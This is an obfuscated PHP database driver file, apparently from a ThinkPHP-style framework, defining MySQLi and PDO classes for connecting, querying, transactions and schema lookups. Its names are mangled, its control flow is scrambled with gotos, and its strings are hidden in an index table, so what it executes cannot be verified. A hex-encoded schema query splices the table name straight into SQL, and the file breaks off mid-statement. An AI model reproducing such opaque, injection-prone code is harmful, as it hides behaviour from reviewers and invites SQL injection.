<?php
 goto EÛ¸¨Ùõ²š; DåİÊ°´ÚÆ: define($_SERVER[¼€¼ˆ¦‚¡][1933], 2); define($_SERVER[¼€¼ˆ¦‚¡][1934], 3); define($_SERVER[¼€¼ˆ¦‚¡][1935], 4); goto D¥®¡É—Í‰; eŸØ´šòåô: class DbMysqli extends Db { public function __construct($EÁî£ÆÄ¶ = '') { $Døƒ¹–‹Â¶ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!extension_loaded($Døƒ¹–‹Â¶[723])) { think_exception(think_lang($Døƒ¹–‹Â¶[10]) . $Døƒ¹–‹Â¶[824]); } if (!empty($EÁî£ÆÄ¶)) { $this->config = $EÁî£ÆÄ¶; if (empty($this->config[$Døƒ¹–‹Â¶[13]])) { $this->config[$Døƒ¹–‹Â¶[13]] = $Døƒ¹–‹Â¶[33]; } } } public function connect($fÅÌ¹²™Ô = '', $c¥‘›”ª‰° = 0) { $B‚ÅŞ‘õ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->linkID[$c¥‘›”ª‰°])) { goto C–íËìÎ¤§; a‰®œ¡øÁ–: $this->connected = !0; if (1 != think_config($B‚ÅŞ‘õ[18])) { unset($this->config); } goto céÜö˜äÄâ; C–íËìÎ¤§: if (empty($fÅÌ¹²™Ô)) { $fÅÌ¹²™Ô = $this->config; } $this->linkID[$c¥‘›”ª‰°] = new mysqli($fÅÌ¹²™Ô[$B‚ÅŞ‘õ[798]], $fÅÌ¹²™Ô[$B‚ÅŞ‘õ[800]], $fÅÌ¹²™Ô[$B‚ÅŞ‘õ[801]], $fÅÌ¹²™Ô[$B‚ÅŞ‘õ[17]], $fÅÌ¹²™Ô[$B‚ÅŞ‘õ[799]] ? intval($fÅÌ¹²™Ô[$B‚ÅŞ‘õ[799]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto cÑèâ’ñíÇ; cÑèâ’ñíÇ: $b†½ğÇ…ñ = $this->linkID[$c¥‘›”ª‰°]->server_version; $this->linkID[$c¥‘›”ª‰°]->query($B‚ÅŞ‘õ[802] . think_config($B‚ÅŞ‘õ[803]) . $B‚ÅŞ‘õ[55]); if ($b†½ğÇ…ñ > $B‚ÅŞ‘õ[804]) { $this->linkID[$c¥‘›”ª‰°]->query($B‚ÅŞ‘õ[805]); } goto a‰®œ¡øÁ–; céÜö˜äÄâ: } return $this->linkID[$c¥‘›”ª‰°]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aÈÏ‚ƒ–ò©) { goto BˆŠ°Ÿº£; BˆŠ°Ÿº£: $Aåá±¼áÈÊ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CøÕ¥¹ÀÒ; eÓÄ¶èìŠ: think_status($Aåá±¼áÈÊ[20]); $this->queryID = $this->_linkID->query($aÈÏ‚ƒ–ò©); if ($this->_linkID->more_results()) { while (($A¹ôš«¤† = $this->_linkID->next_result()) != NULL) { $A¹ôš«¤†->free_result(); } } goto cŠÌÏéØõø; cŠÌÏéØõø: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto A‰¶Á½‹´; CøÕ¥¹ÀÒ: $this->queryStr = $aÈÏ‚ƒ–ò©; if ($this->queryID) { $this->free(); } think_action_status($Aåá±¼áÈÊ[19], 1); goto eÓÄ¶èìŠ; A‰¶Á½‹´: } public function execute($DëÕ­İµ£â) { goto Aˆ æƒÓµ; Dï¤ƒ†ëö: if (!1 === $DœâììÛÌƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto A§İá”‹ï; FÖµ®Øóèí: $this->queryStr = $DëÕ­İµ£â; if ($this->queryID) { $this->free(); } think_action_status($bÙ¦èæ³[21], 1); goto Eò¡¶Ûø; Aˆ æƒÓµ: $bÙ¦èæ³ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÖµ®Øóèí; Eò¡¶Ûø: think_status($bÙ¦èæ³[20]); $DœâììÛÌƒ = $this->_linkID->query($DëÕ­İµ£â); $this->debug(); goto Dï¤ƒ†ëö; A§İá”‹ï: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dëÈêÁ¦ÂŒ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$dëÈêÁ¦ÂŒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FŠÍÂ…—±š = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FŠÍÂ…—±š) { $this->error(); return !1; } } return !0; } private function getAll() { $fˆ¥â¦Îšß = array(); if ($this->numRows > 0) { for ($aÇ÷–Ñ™À‚ = 0; $aÇ÷–Ñ™À‚ < $this->numRows; $aÇ÷–Ñ™À‚++) { $fˆ¥â¦Îšß[$aÇ÷–Ñ™À‚] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $fˆ¥â¦Îšß; } public function getFields($f³í¹Ë¸×±) { $f¦Ÿ÷Êè =& $_SERVER[¼€¼ˆ¦‚¡]; $Bêøíœä©Á = $this->query($f¦Ÿ÷Êè[809] . $this->parseKey($f³í¹Ë¸×±)); $fåµÀ´¾º“ = array(); if ($Bêøíœä©Á) { foreach ($Bêøíœä©Á as $fÉ­­º¸ => $cù•¡ßò“£) { $fåµÀ´¾º“[$cù•¡ßò“£[$f¦Ÿ÷Êè[27]]] = array($f¦Ÿ÷Êè[28] => $cù•¡ßò“£[$f¦Ÿ÷Êè[27]], $f¦Ÿ÷Êè[29] => $cù•¡ßò“£[$f¦Ÿ÷Êè[30]], $f¦Ÿ÷Êè[31] => (bool) ($cù•¡ßò“£[$f¦Ÿ÷Êè[32]] === $f¦Ÿ÷Êè[33]), $f¦Ÿ÷Êè[34] => $cù•¡ßò“£[$f¦Ÿ÷Êè[35]], $f¦Ÿ÷Êè[36] => strtolower($cù•¡ßò“£[$f¦Ÿ÷Êè[37]]) == $f¦Ÿ÷Êè[38], $f¦Ÿ÷Êè[39] => strtolower($cù•¡ßò“£[$f¦Ÿ÷Êè[40]]) == $f¦Ÿ÷Êè[41]); } } return $fåµÀ´¾º“; } public function getTables($Cí›ëÌÏ–‚ = '') { $C¹Ó÷Áğ”™ =& $_SERVER[¼€¼ˆ¦‚¡]; $fš´Í†Ø÷µ = !empty($Cí›ëÌÏ–‚) ? $C¹Ó÷Áğ”™[811] . $Cí›ëÌÏ–‚ : $C¹Ó÷Áğ”™[812]; $bºª¦¶‹Ê’ = $this->query($fš´Í†Ø÷µ); $B‰´ª†Ê¶ß = array(); if ($bºª¦¶‹Ê’) { foreach ($bºª¦¶‹Ê’ as $aÀ£¡š ‡› => $a®éäãô‘Ë) { $B‰´ª†Ê¶ß[$aÀ£¡š ‡›] = current($a®éäãô‘Ë); } } return $B‰´ª†Ê¶ß; } public function replace($c‚‰ÌùíºÌ, $c’„ğÃ“ï = array()) { $Aø¡ë¶…ˆ‡ =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($c‚‰ÌùíºÌ as $B§ßÈ³º–‹ => $CÎ×†Ã¾Ù) { $d„îÍ¨‚Î† = $this->parseValue($CÎ×†Ã¾Ù); if (is_scalar($d„îÍ¨‚Î†)) { $B–¡‘ŠŞ‚[] = $d„îÍ¨‚Î†; $aî‰ø©ƒ‹‹[] = $this->parseKey($B§ßÈ³º–‹); } } $B’Ò÷á¶è´ = $Aø¡ë¶…ˆ‡[813] . $this->parseTable($c’„ğÃ“ï[$Aø¡ë¶…ˆ‡[267]]) . $Aø¡ë¶…ˆ‡[814] . implode($Aø¡ë¶…ˆ‡[47], $aî‰ø©ƒ‹‹) . $Aø¡ë¶…ˆ‡[815] . implode($Aø¡ë¶…ˆ‡[47], $B–¡‘ŠŞ‚) . $Aø¡ë¶…ˆ‡[816]; return $this->execute($B’Ò÷á¶è´); } public function insertAll($b½ÅÂç”¸–, $fØ¥‰À†â¸ = array(), $b—‰ïÍ™‹ = false) { goto dÀÉÜ‘å£µ; D— ˆáÀäÈ: $cÏÃ©ˆŞ® = ($b—‰ïÍ™‹ ? $e·µÆ˜Áî[818] : $e·µÆ˜Áî[819]) . $e·µÆ˜Áî[820] . $this->parseTable($fØ¥‰À†â¸[$e·µÆ˜Áî[267]]) . $e·µÆ˜Áî[814] . implode($e·µÆ˜Áî[47], $A„å’ÅáÇ©) . $e·µÆ˜Áî[821] . implode($e·µÆ˜Áî[47], $aåˆØ©š­‘); return $this->execute($cÏÃ©ˆŞ®); goto e›ÑÖù¶ê‘; dÀÉÜ‘å£µ: $e·µÆ˜Áî =& $_SERVER[¼€¼ˆ¦‚¡]; if (!is_array($b½ÅÂç”¸–[0])) { return !1; } $A„å’ÅáÇ© = array_keys($b½ÅÂç”¸–[0]); goto F‘Ä Ã’á; F‘Ä Ã’á: $aåˆØ©š­‘ = array(); foreach ($b½ÅÂç”¸– as $c÷‚ƒ¾ï·Ï) { $a÷ÔĞµˆæÃ = array(); foreach ($c÷‚ƒ¾ï·Ï as $dºß³ñêéŒ => $cƒ·‡¯íÈ) { $cƒ·‡¯íÈ = $this->parseValue($cƒ·‡¯íÈ); if (is_scalar($cƒ·‡¯íÈ)) { $a÷ÔĞµˆæÃ[] = $cƒ·‡¯íÈ; } } $aåˆØ©š­‘[] = $e·µÆ˜Áî[248] . implode($e·µÆ˜Áî[47], $a÷ÔĞµˆæÃ) . $e·µÆ˜Áî[816]; } array_walk($A„å’ÅáÇ©, array($this, $e·µÆ˜Áî[817])); goto D— ˆáÀäÈ; e›ÑÖù¶ê‘: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bÙ½¶ªÇ‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->error = $this->_linkID->errno . $bÙ½¶ªÇ‹[4] . $this->_linkID->error; if ($bÙ½¶ªÇ‹[33] != $this->queryStr) { $this->error .= LNG($bÙ½¶ªÇ‹[45]) . $this->queryStr; } think_trace($this->error, $bÙ½¶ªÇ‹[33], $bÙ½¶ªÇ‹[46]); return $this->error; } public function escapeString($B¦ˆ•†À·) { if ($this->_linkID) { return $this->_linkID->real_escape_string($B¦ˆ•†À·); } else { return addslashes($B¦ˆ•†À·); } } public function parseKey(&$bö‚êó®‚–, $fÑò†èĞ“ = true) { $CÑ­¦ˆİ£Ü =& $_SERVER[¼€¼ˆ¦‚¡]; if ($fÑò†èĞ“) { $bö‚êó®‚– = $this->parseKeyCheck($bö‚êó®‚–); } if ($bö‚êó®‚– != $CÑ­¦ˆİ£Ü[176] && !preg_match($CÑ­¦ˆİ£Ü[822], $bö‚êó®‚–)) { $bö‚êó®‚– = $CÑ­¦ˆİ£Ü[823] . trim($bö‚êó®‚–, $CÑ­¦ˆİ£Ü[823]) . $CÑ­¦ˆİ£Ü[823]; } return $bö‚êó®‚–; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($d³ïÒ­Ô°¢ = '') { $d–èˆÂÇ¿İ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!class_exists($d–èˆÂÇ¿İ[825])) { think_exception(think_lang($d–èˆÂÇ¿İ[10]) . $d–èˆÂÇ¿İ[826]); } if (!empty($d³ïÒ­Ô°¢)) { $this->config = $d³ïÒ­Ô°¢; if (empty($this->config[$d–èˆÂÇ¿İ[13]])) { $this->config[$d–èˆÂÇ¿İ[13]] = array(); } } } public function connect($AÅ‰Š–“´ = '', $C‚ÊƒèàŒŸ = 0) { $Côóù¤“½Ç =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->linkID[$C‚ÊƒèàŒŸ])) { goto cæòëĞŒîô; b©¶ãæÉæ°: $this->dbType = $this->_getDsnType($AÅ‰Š–“´[$Côóù¤“½Ç[827]]); if (in_array($this->dbType, array($Côóù¤“½Ç[828], $Côóù¤“½Ç[829], $Côóù¤“½Ç[830], $Côóù¤“½Ç[831]))) { think_exception($Côóù¤“½Ç[832] . $this->dbType . $Côóù¤“½Ç[833] . $this->dbType . $Côóù¤“½Ç[834]); } if (!$this->linkID[$C‚ÊƒèàŒŸ]) { think_exception($Côóù¤“½Ç[835]); } goto dÁâéĞ‚; dÁâéĞ‚: $this->linkID[$C‚ÊƒèàŒŸ]->exec($Côóù¤“½Ç[836] . think_config($Côóù¤“½Ç[803])); $this->connected = !0; if (1 != think_config($Côóù¤“½Ç[18])) { unset($this->config); } goto C˜¸Ê£Š¸¨; cæòëĞŒîô: if (empty($AÅ‰Š–“´)) { $AÅ‰Š–“´ = $this->config; } if ($this->pconnect) { $AÅ‰Š–“´[$Côóù¤“½Ç[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$C‚ÊƒèàŒŸ] = new PDO($AÅ‰Š–“´[$Côóù¤“½Ç[827]], $AÅ‰Š–“´[$Côóù¤“½Ç[800]], $AÅ‰Š–“´[$Côóù¤“½Ç[801]], $AÅ‰Š–“´[$Côóù¤“½Ç[13]]); } catch (PDOException $eïÅµîÔÇ™) { think_exception($eïÅµîÔÇ™->getMessage()); } goto b©¶ãæÉæ°; C˜¸Ê£Š¸¨: } return $this->linkID[$C‚ÊƒèàŒŸ]; } public function free() { $this->PDOStatement = null; } public function query($Bïóù®‹‡¼, $D¾™‹„ÖÏâ = array()) { goto dçÉŒÏÁÀ‡; b¤°–êÔ’ï: think_action_status($b ñ¦Â¸†â[19], 1); think_status($b ñ¦Â¸†â[20]); $this->PDOStatement = $this->_linkID->prepare($Bïóù®‹‡¼); goto dÂÌ×…ˆÖ; dÂÌ×…ˆÖ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $AÄğ’§ = $this->PDOStatement->execute($D¾™‹„ÖÏâ); $this->debug(); goto FŒÈ¯Ô®è©; FŒÈ¯Ô®è©: if (!1 === $AÄğ’§) { $this->error(); return !1; } else { return $this->getAll(); } goto aÒä÷ˆ„Õ«; CœæÒÄ¯Œ÷: $this->queryStr = $Bïóù®‹‡¼; if (!empty($D¾™‹„ÖÏâ)) { $this->queryStr .= $b ñ¦Â¸†â[837] . print_r($D¾™‹„ÖÏâ, !0) . $b ñ¦Â¸†â[838]; } if (!empty($this->PDOStatement)) { $this->free(); } goto b¤°–êÔ’ï; dçÉŒÏÁÀ‡: $b ñ¦Â¸†â =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CœæÒÄ¯Œ÷; aÒä÷ˆ„Õ«: } public function execute($E«îòŸâÆ», $F†·ïÚØ³¿ = array()) { goto CŸÔÇØÌô²; cÏƒ«°ÇØ­: $f¥¬Úó´‚ğ = $this->PDOStatement->execute($F†·ïÚØ³¿); $this->debug(); if (!1 === $f¥¬Úó´‚ğ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($BËÃ‘¤®ß || preg_match($D¢²á—ÖÏÀ[843], $E«îòŸâÆ»)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto cé¨íŞÆ°; dö¸ê£›–·: think_status($D¢²á—ÖÏÀ[20]); $this->PDOStatement = $this->_linkID->prepare($E«îòŸâÆ»); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cÏƒ«°ÇØ­; bËÄ¾èÙÈ: if ($this->dbType == $D¢²á—ÖÏÀ[831]) { if (preg_match($D¢²á—ÖÏÀ[839], $this->queryStr, $EÙÃ»ÂÜí˜)) { $this->table = think_config($D¢²á—ÖÏÀ[840]) . str_ireplace(think_config($D¢²á—ÖÏÀ[841]), $D¢²á—ÖÏÀ[361], $EÙÃ»ÂÜí˜[2]); $BËÃ‘¤®ß = (bool) $this->query($D¢²á—ÖÏÀ[842] . strtoupper($this->table) . $D¢²á—ÖÏÀ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($D¢²á—ÖÏÀ[21], 1); goto dö¸ê£›–·; eÕ¶‚›á“å: $this->queryStr = $E«îòŸâÆ»; if (!empty($F†·ïÚØ³¿)) { $this->queryStr .= $D¢²á—ÖÏÀ[837] . print_r($F†·ïÚØ³¿, !0) . $D¢²á—ÖÏÀ[838]; } $BËÃ‘¤®ß = !1; goto bËÄ¾èÙÈ; CŸÔÇØÌô²: $D¢²á—ÖÏÀ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÕ¶‚›á“å; cé¨íŞÆ°: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d¬Ó”„Æ÷” = $this->_linkID->commit(); $this->transTimes = 0; if (!$d¬Ó”„Æ÷”) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F™×Ìì•´â = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F™×Ìì•´â) { $this->error(); return !1; } } return !0; } private function getAll() { $BëË’ğêç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($BëË’ğêç); return $BëË’ğêç; } public function getFields($E Œ¨ãÄĞ) { goto bÀ„Ãî„Ê; Dì»µ‘¼—ï: $aŞªîÙÖ–Ï = $this->query($aÅêÜ¶œò); $CÕë“°ï£Ÿ = array(); if ($aŞªîÙÖ–Ï) { foreach ($aŞªîÙÖ–Ï as $Cæ‰°ª»ÕÅ => $A¡²¢‚Ö) { $A¡²¢‚Ö = array_change_key_case($A¡²¢‚Ö); $A¡²¢‚Ö[$cÖñ„ßòÇô[28]] = isset($A¡²¢‚Ö[$cÖñ„ßòÇô[28]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[28]] : $cÖñ„ßòÇô[361]; $A¡²¢‚Ö[$cÖñ„ßòÇô[29]] = isset($A¡²¢‚Ö[$cÖñ„ßòÇô[29]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[29]] : $cÖñ„ßòÇô[361]; $E‡ßÚªŞˆÄ = isset($A¡²¢‚Ö[$cÖñ„ßòÇô[261]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[261]] : $A¡²¢‚Ö[$cÖñ„ßòÇô[28]]; $CÕë“°ï£Ÿ[$E‡ßÚªŞˆÄ] = array($cÖñ„ßòÇô[28] => $E‡ßÚªŞˆÄ, $cÖñ„ßòÇô[29] => $A¡²¢‚Ö[$cÖñ„ßòÇô[29]], $cÖñ„ßòÇô[31] => (bool) (isset($A¡²¢‚Ö[$cÖñ„ßòÇô[99]]) && $A¡²¢‚Ö[$cÖñ„ßòÇô[99]] === $cÖñ„ßòÇô[33] || isset($A¡²¢‚Ö[$cÖñ„ßòÇô[31]]) && $A¡²¢‚Ö[$cÖñ„ßòÇô[31]] === $cÖñ„ßòÇô[33]), $cÖñ„ßòÇô[34] => isset($A¡²¢‚Ö[$cÖñ„ßòÇô[34]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[34]] : (isset($A¡²¢‚Ö[$cÖñ„ßòÇô[53]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[53]] : $cÖñ„ßòÇô[361]), $cÖñ„ßòÇô[36] => isset($A¡²¢‚Ö[$cÖñ„ßòÇô[89]]) ? strtolower($A¡²¢‚Ö[$cÖñ„ßòÇô[89]]) == $cÖñ„ßòÇô[38] : (isset($A¡²¢‚Ö[$cÖñ„ßòÇô[54]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[54]] : !1), $cÖñ„ßòÇô[39] => isset($A¡²¢‚Ö[$cÖñ„ßòÇô[860]]) ? strtolower($A¡²¢‚Ö[$cÖñ„ßòÇô[860]]) == $cÖñ„ßòÇô[41] : (isset($A¡²¢‚Ö[$cÖñ„ßòÇô[89]]) ? $A¡²¢‚Ö[$cÖñ„ßòÇô[89]] : !1)); } } goto fÌ‘µƒˆ‡¤; fÌ‘µƒˆ‡¤: return $CÕë“°ï£Ÿ; goto Eµ™ÀëÈ‚ö; bÀ„Ãî„Ê: $cÖñ„ßòÇô =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!0); if (think_config($cÖñ„ßòÇô[844])) { $aÅêÜ¶œò = str_replace($cÖñ„ßòÇô[845], $E Œ¨ãÄĞ, think_config($cÖñ„ßòÇô[844])); } else { switch ($this->dbType) { case $cÖñ„ßòÇô[828]: case $cÖñ„ßòÇô[846]: $aÅêÜ¶œò = "\x53\105\x4c\x45\103\x54\40\x20\x20\143\x6f\154\165\155\156\x5f\x6e\x61\155\145\40\141\x73\40\x27\x4e\x61\x6d\145\47\x2c\x20\x20\40\144\x61\164\x61\x5f\164\171\x70\145\40\x61\163\x20\x27\124\171\160\145\47\54\40\x20\40\143\157\x6c\x75\155\156\137\x64\x65\x66\x61\x75\154\x74\x20\x61\x73\40\x27\104\145\146\141\165\x6c\164\x27\x2c\40\40\40\x69\x73\x5f\156\165\154\x6c\x61\142\x6c\145\x20\x61\163\x20\47\116\x75\x6c\x6c\47\xa\x9\x9\106\x52\x4f\x4d\x9\151\x6e\146\x6f\162\x6d\x61\164\151\157\x6e\137\x73\x63\150\x65\x6d\x61\56\x74\x61\x62\154\x65\x73\40\x41\x53\40\x74\xa\11\11\112\x4f\111\x4e\11\x69\156\x66\157\162\155\141\164\x69\x6f\x6e\137\x73\143\x68\x65\155\x61\x2e\x63\157\x6c\165\x6d\156\x73\40\x41\x53\40\x63\xa\x9\x9\x4f\x4e\40\x20\x74\x2e\164\x61\x62\154\145\x5f\x63\x61\x74\141\x6c\157\x67\x20\x3d\x20\x63\x2e\164\x61\x62\x6c\145\x5f\x63\141\164\141\x6c\157\147\12\x9\x9\101\116\104\x20\164\56\x74\x61\x62\x6c\145\x5f\x73\143\x68\145\x6d\141\40\x3d\40\143\56\164\141\142\154\145\137\x73\x63\150\145\155\x61\xa\x9\x9\101\116\104\40\164\56\164\x61\x62\x6c\x65\137\x6e\x61\155\x65\40\x3d\40\x63\x2e\x74\141\x62\x6c\145\137\x6e\x61\155\145\12\11\x9\127\x48\105\x52\105\x20\x20\40\164\x2e\164\x61\142\154\x65\137\156\141\155\x65\40\x3d\x20\x27{$E Œ¨ãÄĞ}\x27"; break; case $cÖñ„ßòÇô[847]: $aÅêÜ¶œò = $cÖñ„ßòÇô[848] . $E Œ¨ãÄĞ . $cÖñ„ßòÇô[849]; break; case $cÖñ„ßòÇô[829]: case $cÖñ„ßòÇô[831]: $aÅêÜ¶œò = $cÖñ„ßòÇô[850] . $cÖñ„ßòÇô[851] . $cÖñ„ßòÇô[852] . strtoupper($E Œ¨ãÄĞ) . $cÖñ„ßòÇô[853] . strtoupper($E Œ¨ãÄĞ) . $cÖñ„ßòÇô[854]; break; case $cÖñ„ßòÇô[855]: $aÅêÜ¶œò = $cÖñ„ßòÇô[856] . $E Œ¨ãÄĞ . $cÖñ„ßòÇô[857]; break; case $cÖñ„ßòÇô[830]: break; case $cÖñ„ßòÇô[858]: default: $aÅêÜ¶œò = $cÖñ„ßòÇô[859] . ($this->dbType == $cÖñ„ßòÇô[858] ? "\x60{$E Œ¨ãÄĞ}\140" : $E Œ¨ãÄĞ); } } goto Dì»µ‘¼—ï; Eµ™ÀëÈ‚ö: } public function getTables($A‹¶µõ‘Ç = '') { $Dƒô…Ù‘¤³ =& $_SERVER[¼€¼ˆ¦‚¡]; if (think_config($Dƒô…Ù‘¤³[861])) { $fğùêˆ£á = str_replace($Dƒô…Ù‘¤³[862], $A‹¶µõ‘Ç, think_config($Dƒô…Ù‘¤³[861])); } else { switch ($this->dbType) { case $Dƒô…Ù‘¤³[829]: case $Dƒô…Ù‘¤³[831]: $fğùêˆ£á = $Dƒô…Ù‘¤³[863]; break; case $Dƒô…Ù‘¤³[828]: case $Dƒô…Ù‘¤³[846]: $fğùêˆ£á = $Dƒô…Ù‘¤³[864]; break; case $Dƒô…Ù‘¤³[855]: $fğùêˆ£á = $Dƒô…Ù‘¤³[865]; break; case $Dƒô…Ù‘¤³[830]: think_exception(think_lang($Dƒô…Ù‘¤³[866]) . $Dƒô…Ù‘¤³[867]); break; case $Dƒô…Ù‘¤³[847]: $fğùêˆ£á = $Dƒô…Ù‘¤³[42] . $Dƒô…Ù‘¤³[43] . $Dƒô…Ù‘¤³[44]; break; case $Dƒô…Ù‘¤³[858]: default: if (!empty($A‹¶µõ‘Ç)) { $fğùêˆ£á = $Dƒô…Ù‘¤³[811] . $A‹¶µõ‘Ç; } else { $fğùêˆ£á = $Dƒô…Ù‘¤³[812]; } } } $d®œ»ç³ŸÒ = $this->query($fğùêˆ£á); $EŠ’İÂºØ = array(); foreach ($d®œ»ç³ŸÒ as $D‘Æ±èĞ´å => $FÖ›¶¨çÄ£) { $EŠ’İÂºØ[$D‘Æ±èĞ´å] = current($FÖ›¶¨çÄ£); } return $EŠ’İÂºØ; } protected function parseLimit($AÜ‘àèŒ) { $F¯’ä¥ïê =& $_SERVER[¼€¼ˆ¦‚¡]; $bÀ¡±ƒ¢Â• = $F¯’ä¥ïê[33]; if (!empty($AÜ‘àèŒ)) { switch ($this->dbType) { case $F¯’ä¥ïê[855]: case $F¯’ä¥ïê[847]: $AÜ‘àèŒ = explode($F¯’ä¥ïê[47], $AÜ‘àèŒ); if (count($AÜ‘àèŒ) > 1) { $bÀ¡±ƒ¢Â• .= $F¯’ä¥ïê[48] . $AÜ‘àèŒ[1] . $F¯’ä¥ïê[49] . $AÜ‘àèŒ[0] . $F¯’ä¥ïê[50]; } else { $bÀ¡±ƒ¢Â• .= $F¯’ä¥ïê[48] . $AÜ‘àèŒ[0] . $F¯’ä¥ïê[50]; } break; case $F¯’ä¥ïê[828]: case $F¯’ä¥ïê[846]: break; case $F¯’ä¥ïê[830]: break; case $F¯’ä¥ïê[829]: case $F¯’ä¥ïê[831]: break; case $F¯’ä¥ïê[858]: default: $bÀ¡±ƒ¢Â• .= $F¯’ä¥ïê[48] . $AÜ‘àèŒ . $F¯’ä¥ïê[50]; } } return $bÀ¡±ƒ¢Â•; } public function parseKey(&$a®â¢¡“ï, $b­ËÌøœ£‡ = true) { $b¡‹²ßŒŒ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($b­ËÌøœ£‡) { $a®â¢¡“ï = $this->parseKeyCheck($a®â¢¡“ï); } if ($this->dbType == $b¡‹²ßŒŒ[858]) { if ($a®â¢¡“ï != $b¡‹²ßŒŒ[176] && !preg_match($b¡‹²ßŒŒ[822], $a®â¢¡“ï)) { $a®â¢¡“ï = $b¡‹²ßŒŒ[823] . trim($a®â¢¡“ï, $b¡‹²ßŒŒ[823]) . $b¡‹²ßŒŒ[823]; } return $a®â¢¡“ï; } else { return parent::parseKey($a®â¢¡“ï); } } public function close() { $this->_linkID = null; } public function error() { $E¤ƒƒ‚’å =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->PDOStatement) { $EĞã ”ôÁ = $this->PDOStatement->errorInfo(); $this->error = $EĞã ”ôÁ[1] . $E¤ƒƒ‚’å[4] . $EĞã ”ôÁ[2]; } else { $this->error = $E¤ƒƒ‚’å[33]; } if ($E¤ƒƒ‚’å[33] != $this->queryStr) { $this->error .= LNG($E¤ƒƒ‚’å[45]) . $this->queryStr; } think_trace($this->error, $E¤ƒƒ‚’å[33], $E¤ƒƒ‚’å[46]); return $this->error; } public function escapeString($E•Œ¬°‰’‘) { $FÚÙ…ŞÛó“ =& $_SERVER[¼€¼ˆ¦‚¡]; switch ($this->dbType) { case $FÚÙ…ŞÛó“[855]: case $FÚÙ…ŞÛó“[828]: case $FÚÙ…ŞÛó“[846]: case $FÚÙ…ŞÛó“[858]: return addslashes($E•Œ¬°‰’‘); case $FÚÙ…ŞÛó“[830]: case $FÚÙ…ŞÛó“[847]: case $FÚÙ…ŞÛó“[829]: case $FÚÙ…ŞÛó“[831]: return str_ireplace($FÚÙ…ŞÛó“[55], $FÚÙ…ŞÛó“[56], $E•Œ¬°‰’‘); } } protected function parseValue($d»®ìì”Ë) { $bõİ¶ôÅ³¤ =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_string($d»®ìì”Ë)) { $d»®ìì”Ë = strpos($d»®ìì”Ë, $bõİ¶ôÅ³¤[4]) === 0 ? $this->escapeString($d»®ìì”Ë) : $bõİ¶ôÅ³¤[868] . $this->escapeString($d»®ìì”Ë) . $bõİ¶ôÅ³¤[868]; } elseif (isset($d»®ìì”Ë[0]) && is_string($d»®ìì”Ë[0]) && strtolower($d»®ìì”Ë[0]) == $bõİ¶ôÅ³¤[285]) { $d»®ìì”Ë = $this->escapeString($d»®ìì”Ë[1]); } elseif (is_array($d»®ìì”Ë)) { $d»®ìì”Ë = array_map(array($this, $bõİ¶ôÅ³¤[869]), $d»®ìì”Ë); } elseif (is_bool($d»®ìì”Ë)) { $d»®ìì”Ë = $d»®ìì”Ë ? $bõİ¶ôÅ³¤[83] : $bõİ¶ôÅ³¤[468]; } elseif (is_null($d»®ìì”Ë)) { $d»®ìì”Ë = $bõİ¶ôÅ³¤[99]; } return $d»®ìì”Ë; } public function getLastInsertId() { $E×»Â½´ =& $_SERVER[¼€¼ˆ¦‚¡]; switch ($this->dbType) { case $E×»Â½´[855]: case $E×»Â½´[847]: case $E×»Â½´[828]: case $E×»Â½´[846]: case $E×»Â½´[830]: case $E×»Â½´[858]: return $this->_linkID->lastInsertId(); case $E×»Â½´[829]: case $E×»Â½´[831]: $B”´£Ã°åÂ = $this->table; $bğ™®ÄØÉ = 